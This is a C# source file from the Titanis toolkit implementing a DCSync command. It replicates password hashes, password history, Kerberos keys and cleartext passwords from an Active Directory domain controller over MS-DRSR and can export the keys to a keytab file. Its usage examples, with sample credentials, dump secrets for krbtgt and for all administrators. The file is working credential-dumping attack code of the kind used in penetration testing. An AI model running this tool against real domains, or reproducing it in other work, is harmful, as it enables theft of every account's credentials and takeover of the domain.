using System.ComponentModel;
using System.Globalization;
using System.Net;
using Titanis;
using Titanis.Cli;
using Titanis.Ldap;
using Titanis.Msrpc.Msdrsr;
using Titanis.Net;
using Titanis.Security;
using Titanis.Security.Kerberos;
using Titanis.Winterop.SamServer;

namespace Titanis.Cli.Dsrep;

/// <task category="Directory Replication;Enumeration">Replicate secret attributes from a domain controller (DCSync)</task>
/// <task category="Directory Replication;Enumeration">Export Kerberos keys for domain accounts to a .keytab file</task>
[OutputRecordType(typeof(LdapEntry), DefaultOutputStyle = OutputStyle.List, DefaultFields = [
	nameof(LdapEntry.EntryName),
	nameof(LdapAttributeTypes.SAMAccountName),
	nameof(LdapAttributeTypes.GivenName),
	nameof(LdapAttributeTypes.UserPrincipalName),
	nameof(LdapAttributeTypes.InstanceType),
	nameof(LdapAttributeTypes.UserAccountControl),
	nameof(LdapAttributeTypes.DBCSPwd),
	nameof(LdapAttributeTypes.UnicodePwd),
	nameof(LdapAttributeTypes.LmPwdHistory),
	nameof(LdapAttributeTypes.NtPwdHistory),
	"cleartextPassword",
	"kerberosKeys",
	"kerberosOldKeys",
	])]
[DetailedHelpText(@"This command uses [MS-DRSR] to query attributes of an object by SID, GUID, distinguished name, LDAP query, or object name.

In addition to the standard attributes defined by Active Directory, you may query the special attributes kerberosKeys, kerberosOldKeys, or cleartextPassword.  When one of these attributes is specified, {0} implicitly queries supplementalCredentials and unpacks the credentials contained within.")]
[Example("Query for all objects with all attributes", "{0} -UserName milchick@LUMON -Password Br3@kr00m! LUMON-DC1", Tag = "milchick_all")]
[Example("Query credentials for krbtgt and milchick", "{0} -UserName milchick@LUMON -Password Br3@kr00m! LUMON-DC1 krbtgt, \"CN=Seth Milchick,OU=Severed Floor,OU=Kier\\, PE,DC=lumon,DC=ind\" -OutputFields samAccountName, objectSid,  kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory", Tag = "milchick_name_dn")]
[Example("Query credentials for all administrators", "{0} -UserName milchick@LUMON -Password Br3@kr00m! LUMON-DC1 (memberOf*=<SID=S-1-5-32-544>) -OutputFields samAccountName, objectSid,  kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory", Tag = "milchick_LdapQuery")]
public abstract class ReplicateCommand : DsbindCommand, IDrsChangeCallback, IHaveServerName
{
	[Parameter]
	[Description("Name of keytab file to export to")]
	public FileSpec? ExportKeytab { get; set; }

	[Parameter]
	[Description("Starting USN vector (as 48 hex bytes)")]
	public UsnVector FromUsnvec { get; set; }

	[Parameter]
	[Description("Max number of objects per chunk (approx.)")]
	[DefaultValue(1000)]
	public int ChunkObjectLimit { get; set; }

	[Parameter]
	[Description("Max bytes per chunk (approx.)")]
	[DefaultValue(10 << 20)]
	public int ChunkSizeLimit { get; set; }

	protected virtual int GetDegreeOfParallelism() => 1;

	protected override DsbindScenario Scenario => DsbindScenario.Repnc;

	private string[] GetLdapAttributes(string[] fieldNames)
	{
		List<string> attrOids = new(fieldNames.Length);
		HashSet<string> fieldsAdded = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
		bool wantsSuppCreds = false;
		foreach (var name in fieldNames)
		{
			if (nameof(LdapEntry.EntryName).Equals(name, StringComparison.OrdinalIgnoreCase))
				// Ignore
				continue;
			if (fieldsAdded.Add(name))
			{
				var attr = LdapAttributeTypes.TryGetByNameOrOid(name);
				if (attr != null)
					attrOids.Add(attr.Oid);
				else if (Array.IndexOf(SupplementalCredetialAttributes, name.ToUpper()) >= 0)
					wantsSuppCreds = true;
				else
					this.WriteWarning($"Attribute name '{name}' could not be resolved.");
			}
		}

		if (wantsSuppCreds)
			attrOids.Add(LdapAttributeTypes.SupplementalCredentials.Oid);
		if (this.ExportKeytab != null)
		{
			attrOids.Add(LdapAttributeTypes.ServicePrincipalName.Oid);
			attrOids.Add(LdapAttributeTypes.MsDSKeyVersionNumber.Oid);
		}

		return attrOids.ToArray();
	}

	private const string CleartextPasswordName = "cleartextPassword";
	private const string KerberosOldKeysName = "kerberosOldKeys";
	private const string KerberosKeysName = "kerberosKeys";
	private readonly static string[] SupplementalCredetialAttributes = [
		"KERBEROSKEYS",
		"KERBEROSOLDKEYS",
		"CLEARTEXTPASSWORD",
		];
	private List<KeytabEntry> _keytabEntries;
	private string? _realm;

	protected abstract ExtendedOpRequest GetExop();

	protected override async Task<int> RunAsync(DirectoryReplicationClient client, DsBinding dsbind, CancellationToken cancellationToken)
	{
		var dcInfos = await dsbind.GetDcInfo(this.RpcParameters.Authentication.UserDomain, cancellationToken);
		if (dcInfos.Length == 0)
		{
			this.WriteError($"Unable to find any DCs.");
			return 1;
		}
		var dcInfo = dcInfos[0];

		this._realm = dcInfo.DnsHostName.Contains('.') ? dcInfo.DnsHostName.Substring(dcInfo.DnsHostName.IndexOf('.') + 1).ToUpper() : null;




		var outputAttrs = GetLdapAttributes(this.OutputFields);

		var kt = new KeytabFile();
		this._keytabEntries = kt.Entries;

		int maxParallel = this.GetDegreeOfParallelism();
		if (maxParallel < 1)
			maxParallel = 1;
		var usnvec = await dsbind.GetNcChanges(
			dcInfo,
			this.GetObjectNames(cancellationToken),
			outputAttrs,
			this.ChunkObjectLimit,
			this.ChunkSizeLimit,
			this.FromUsnvec,
			this,
			maxParallel,
			this.GetExop(),
			cancellationToken);

		if (maxParallel == 1)
			this.WriteMessage($"Up-to-date USN vector: {usnvec.ToBytes().ToHexString()}");

		if (this.ExportKeytab != null)
		{
			if (kt.Entries.Count == 0)
				this.WriteWarning($"No keys collected; will not export empty keytab file.");
			else
			{
				var ktFile = this.ExportKeytab;
				byte[] ktBytes = kt.ToBytes();
				this.FileAccessService.WriteAllBytesTo(ktFile, ktBytes);
				this.WriteVerbose($"Wrote {ktBytes.Length} to {ktFile}.");
			}
		}

		return 0;
	}

	protected abstract IAsyncEnumerable<DsName> GetObjectNames(CancellationToken cancellationToken);

	private void AddKeytabEntries(LdapEntry entry, string realm, List<KeytabEntry> keytabEntries)
	{
		var userName = entry[LdapAttributeTypes.SAMAccountName]?.Value as string;
		if (!string.IsNullOrEmpty(userName))
		{
			AddKeys(entry, new SimplePrincipalName(userName), realm, keytabEntries);
		}

		var spns = entry[LdapAttributeTypes.ServicePrincipalName]?.Values;
		if (spns != null)
		{
			foreach (string spn in spns)
			{
				AddKeys(entry, ServicePrincipalName.Parse(spn), realm, keytabEntries);
			}
		}
	}

	private static void AddKeys(LdapEntry entry, SecurityPrincipalName upn, string realm, List<KeytabEntry> keytabEntries)
	{
		// Current key
		{
			var newKeys = entry[KerberosKeysName]?.Values;
			if (newKeys != null)
			{
				foreach (KerberosKeyInfo key in newKeys)
				{
					keytabEntries.Add(CreateKeytabEntry(realm, upn, key));
				}
			}
		}
		// Old (and older) keys
		var oldKeys = entry[KerberosOldKeysName]?.Values;
		if (oldKeys != null)
		{
			for (int i = 0; i < oldKeys.Length; i++)
			{
				var key = (KerberosKeyInfo)oldKeys[i];
				keytabEntries.Add(CreateKeytabEntry(realm, upn, key));
			}
		}
	}

	private static KeytabEntry CreateKeytabEntry(string realm, SecurityPrincipalName spn, KerberosKeyInfo key)
	{
		return new KeytabEntry(spn, realm, 0, key.Kvno ?? 0, (EType)key.KeyType, key.Bytes);
	}

	private SemaphoreSlim _outputLock = new SemaphoreSlim(1, 1);
	async Task IDrsChangeCallback.OnObjectReplicated(DsObject obj)
	{
		await this._outputLock.WaitAsync();
		try
		{
			var entry = obj.ToLdapEntry();

			AddKeytabEntries(entry, this._realm, this._keytabEntries);
			this.WriteRecord(entry);
		}
		finally
		{
			this._outputLock.Release();
		}
	}

	async Task IDrsChangeCallback.OnError(DsName objectName, Exception exception)
	{
		await this._outputLock.WaitAsync();
		try
		{
			this.WriteError($"Error retrieving {objectName}: {exception.Message}");
		}
		finally
		{
			this._outputLock.Release();
		}
	}
}

[TypeConverter(typeof(DsobjSpecConverter))]
public class DsobjSpec
{
	public DsobjSpec(DsName dsname)
	{
		this.Dsname = dsname;
	}
	public DsobjSpec(LdapFilter filter)
	{
		this.Filter = filter;
	}
	public DsobjSpec(string name)
	{
		this.Name = name;
	}

	public DsName? Dsname { get; }
	public LdapFilter? Filter { get; }
	public string? Name { get; }

	public override string ToString()
	{
		return (this.Filter?.ToString()) ?? this.Dsname?.ToString() ?? this.Name;
	}
}

public class DsobjSpecConverter : TypeConverter
{
	public override bool CanConvertFrom(ITypeDescriptorContext? context, Type sourceType) => (sourceType == typeof(string)) || base.CanConvertFrom(context, sourceType);
	public override object? ConvertFrom(ITypeDescriptorContext? context, CultureInfo? culture, object value)
	{
		if (value is string str)
		{
			if (str.StartsWith('('))
				return new DsobjSpec(LdapFilter.Parse(str));
			else if (DsName.TryParse(str, out var dsName))
				return new DsobjSpec(dsName);
			else
				return new DsobjSpec(str);
		}
		else
			return base.ConvertFrom(context, culture, value);
	}
}
